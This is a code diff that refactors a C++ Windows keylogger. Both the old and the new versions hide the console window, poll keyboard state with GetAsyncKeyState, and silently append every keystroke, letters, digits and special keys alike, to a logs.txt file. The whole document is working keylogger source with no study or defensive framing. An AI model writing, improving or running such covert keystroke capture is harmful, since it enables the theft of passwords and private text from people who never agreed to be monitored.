@@ -34,345 +34,76 @@ Decimal ASCII Chart
 
 
 */
-#include <iostream>
-#include<windows.h>
-#include<string>
-#include<fstream> 
-#define print(x) std::cout << x << std::endl
-#define _MIN_ASCII_CHAR_ 8
-#define _MAX_ASCII_CHAR_ 255
-#define _KEY_PRESSED_ -32767
 
-std::string convertToKey(int);
+#include <iostream>
+#include <windows.h>
+#include <string>
+#include <fstream>
+#include <map>
+
+const int SLEEP_INTERVAL = 10; 
+const int MS_SHORT_DELAY = 2;
+
+std::ofstream logFile;
+
+std::string convertToKey(int i) {
+    // Check for Alphanumeric keys directly via ASCII logic
+    if (i >= 0x30 && i <= 0x39) return std::string(1, (char)i); // 0-9
+    if (i >= 0x41 && i <= 0x5A) return std::string(1, (char)i); // A-Z
+
+    switch (i) {
+        case VK_SPACE:    return " [SPACE] ";
+        case VK_RETURN:   return " [ENTER]\n";
+        case VK_BACK:     return " [BACKSPACE] ";
+        case VK_TAB:      return " [TAB] ";
+        case VK_SHIFT:    return " [SHIFT] ";
+        case VK_CONTROL:  return " [CTRL] ";
+        case VK_MENU:     return " [ALT] ";
+        case VK_CAPITAL:  return " [CAPS] ";
+        case VK_ESCAPE:   return " [ESC] ";
+        case VK_LEFT:     return " [LEFT] ";
+        case VK_RIGHT:    return " [RIGHT] ";
+        case VK_UP:       return " [UP] ";
+        case VK_DOWN:     return " [DOWN] ";
+        case VK_DELETE:   return " [DEL] ";
+        case VK_SNAPSHOT: return " [PRT SC] ";
+        // F-Keys
+        case VK_F1: case VK_F2: case VK_F3: case VK_F4:
+        case VK_F5: case VK_F6: case VK_F7: case VK_F8:
+        case VK_F9: case VK_F10: case VK_F11: case VK_F12:
+            return " [F" + std::to_string(i - VK_F1 + 1) + "] ";
+        default: return ""; 
+    }
+}
 
 void LogPressedData(int i) {
-    Sleep(10);
-    FILE* LOG_FILE;
-    LOG_FILE = fopen("logs.txt", "a+"); // open file and append data to it 
-    std::string vl = convertToKey(i);
-    if (vl != "def212") {
-        print(vl);
-        fprintf(LOG_FILE, "%s", vl);
+    std::string key = convertToKey(i);
+    if (!key.empty()) {
+        std::cout << key;  
+        logFile << key;
+        logFile.flush(); 
     }
-    else {
-        print(vl);
-        fprintf(LOG_FILE, "%s", &i);
-    }
-
-    fclose(LOG_FILE);
 }
-int main() { 
-    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // hides the console window. Remove this line if you need to view it 
+
+int main() {
+    HWND hwnd = GetConsoleWindow();
+    ShowWindow(hwnd, SW_HIDE);
+    logFile.open("logs.txt", std::ios::app);
+    if (!logFile.is_open()) return 1;
+
     while (true) {
-        Sleep(20);
-        for (char i = _MIN_ASCII_CHAR_; i < _MAX_ASCII_CHAR_; i++) {
-            if (GetAsyncKeyState(i) == _KEY_PRESSED_) {
+        Sleep(SLEEP_INTERVAL); 
+        
+        // Iterate through standard virtual key codes (8 to 190 covers most)
+        for (int i = 8; i <= 190; i++) {
+            if (GetAsyncKeyState(i) & 0x8000) {
                 LogPressedData(i);
-            }// Checks if any key is pressed 
+                
+                while (GetAsyncKeyState(i) & 0x8000) { Sleep(MS_SHORT_DELAY); }
+            }
         }
     }
-}
-std::string convertToKey(int i) {
-    std::string logMessage;
-    switch (i) {
-    case VK_LEFT:
-        logMessage = "LEFT_ARROW\n";
-        // Process the LEFT ARROW key. 
-        break;
 
-    case VK_RIGHT:
-        logMessage = "RIGHT_ARROW\n";
-
-        // Process the RIGHT ARROW key. 
-
-        break;
-
-    case VK_UP:
-        logMessage = "UP_ARROW\n";
-
-        // Process the UP ARROW key. 
-
-        break;
-
-    case VK_DOWN:
-
-        logMessage = "DOWN_ARROW\n";
-        // Process the DOWN ARROW key. 
-
-        break;
-
-    case VK_HOME:
-
-        logMessage = "HOME_KEY\n";
-        // Process the HOME key. 
-
-        break;
-
-    case VK_END:
-
-        logMessage = "END_KEY\n";
-        // Process the END key. 
-        break;
-    case VK_INSERT:
-        logMessage = "INSERT_KEY\n";
-        // Process the INS key. 
-        break;
-    case VK_DELETE:
-        logMessage = "DELETE_KEY\n";
-        // Process the DEL key. 
-        break;
-    case VK_NUMPAD0:
-        logMessage = "Numeric keypad 0 key\n";
-        break;
-    case VK_NUMPAD1:
-        logMessage = "Numeric keypad 1 key\n";
-        break;
-    case VK_NUMPAD2:
-        logMessage = "Numeric keypad 2 key\n";
-        break;
-    case VK_NUMPAD3:
-        logMessage = "Numeric keypad 3 key\n";
-        break;
-    case VK_NUMPAD4:
-        logMessage = "Numeric keypad 4 key\n";
-        break;
-    case VK_NUMPAD5:
-        logMessage = "Numeric keypad 5 key\n";
-        break;
-    case VK_NUMPAD6:
-        logMessage = "Numeric keypad 6 key\n";
-        break;
-    case VK_NUMPAD7:
-        logMessage = "Numeric keypad 7 key\n";
-        break;
-    case VK_NUMPAD8:
-        logMessage = "Numeric keypad 8 key\n";
-        break;
-    case VK_NUMPAD9:
-        logMessage = "Numeric keypad 9 key\n";
-        break;
-
-
-    case VK_MULTIPLY:
-        logMessage = "Multiply key\n";
-        break;
-    case VK_ADD:
-        logMessage = "Add key\n";
-        break;
-    case VK_SEPARATOR:
-
-        logMessage = "Separator key\n";
-        break;
-    case VK_SUBTRACT:
-
-        logMessage = " Subtract key\n";
-        break;
-    case VK_DECIMAL:
-
-        logMessage = "Decimal key";
-        break;
-    case VK_DIVIDE:
-
-        logMessage = "Divide key";
-        break;
-
-    case VK_F1:
-        logMessage = "F1_KEY\n";
-        break;
-    case VK_F2:
-        logMessage = "F2_KEY\n";
-        break;
-    case VK_F3:
-        logMessage = "F3_KEY\n";
-        break;
-    case VK_F4:
-        logMessage = "F4_KEY\n";
-        break;
-    case VK_F5:
-        logMessage = "F5_KEY\n";
-        break;
-    case VK_F6:
-        logMessage = "F6_KEY\n";
-        break;
-    case VK_F7:
-        logMessage = "F7_KEY\n";
-        break;
-    case VK_F8:
-        logMessage = "F8_KEY\n";
-        break;
-    case VK_F9:
-        logMessage = "F9_KEY\n";
-        break;
-    case VK_F10:
-        logMessage = "F10_KEY\n";
-        break;
-    case VK_F11:
-        logMessage = "F11_KEY\n";
-        break;
-    case VK_F12:
-        logMessage = "F12_KEY\n";
-        break;
-    case 0x41:
-        logMessage = "A";
-        break;
-    case 0x42:
-        logMessage = "B";
-        break;
-    case 0x43:
-        logMessage = "C";
-        break;
-    case 0x44:
-        logMessage = "D";
-        break;
-    case 0x45:
-        logMessage = "E";
-        break;
-    case 0x46:
-        logMessage = "F";
-        break;
-    case 0x47:
-        logMessage = "G";
-        break;
-    case 0x48:
-        logMessage = "H";
-        break;
-    case 0x49:
-        logMessage = "I";
-        break;
-    case 0x4A:
-        logMessage = "J";
-        break;
-    case 0x4B:
-        logMessage = "K";
-        break;
-    case 0x4C:
-        logMessage = "L";
-        break;
-    case 0x4D:
-        logMessage = "M";
-        break;
-    case 0x4E:
-        logMessage = "N";
-        break;
-    case 0x4F:
-        logMessage = "O";
-        break;
-    case 0x50:
-        logMessage = "P";
-        break;
-    case 0x51:
-        logMessage = "Q";
-        break;
-    case 0x52:
-        logMessage = "R";
-        break;
-    case 0x53:
-        logMessage = "S";
-        break;
-    case 0x54:
-        logMessage = "T";
-        break;
-    case 0x55:
-        logMessage = "U";
-        break;
-    case 0x56:
-        logMessage = "V";
-        break;
-    case 0x57:
-        logMessage = "W";
-        break;
-    case 0x58:
-        logMessage = "X";
-        break;
-    case 0x59:
-        logMessage = "Y";
-        break;
-    case 0x5A:
-        logMessage = "Z";
-        break;
-    case VK_SELECT:
-        logMessage = "SELECT key";
-        break;
-    case VK_PRINT:
-        logMessage = "PRINT key";
-        break;
-    case VK_EXECUTE:
-        logMessage = "EXECUTE key";
-        break;
-    case VK_SNAPSHOT:
-        logMessage = "PRINT SCREEN key";
-        break;
-    case VK_HELP:
-        logMessage = "HELP key";
-        break;
-
-
-    case 0x30:
-        logMessage = "0";
-        break;
-    case 0x31:
-        logMessage = "1";
-        break;
-    case 0x32:
-        logMessage = "2";
-        break;
-    case 0x33:
-        logMessage = "3";
-        break;
-    case 0x34:
-        logMessage = "4";
-        break;
-    case 0x35:
-        logMessage = "5";
-        break;
-    case 0x36:
-        logMessage = "6";
-        break;
-    case 0x37:
-        logMessage = "7";
-
-        break;
-    case 0x38:
-        logMessage = "8";
-        break;
-    case 0x39:
-        logMessage = "9";
-        break;
-
-    case VK_SPACE:
-        logMessage = "SPACEBAR";
-        break;
-
-
-    case VK_BACK:
-        logMessage = "BACKSPACE";
-        break;
-    case VK_TAB:
-        logMessage = "TAB key";
-        break;
-    case VK_CLEAR:
-        logMessage = "CLEAR key";
-        break;
-    case VK_RETURN:
-        logMessage = "ENTER key";
-        break;
-    case VK_SHIFT:
-        logMessage = "SHIFT key";
-        break;
-    case VK_CONTROL:
-        logMessage = "CTRL key";
-        break;
-    case VK_MENU:
-        logMessage = "ALT key";
-        break;
-    case VK_PAUSE:
-        logMessage = "PAUSE key";
-        break;
-    case VK_CAPITAL:
-        logMessage = "CAPS LOCK key";
-        break;
-    default:
-        return "def";
-    }
-    return logMessage;
+    logFile.close();
+    return 0;
 }
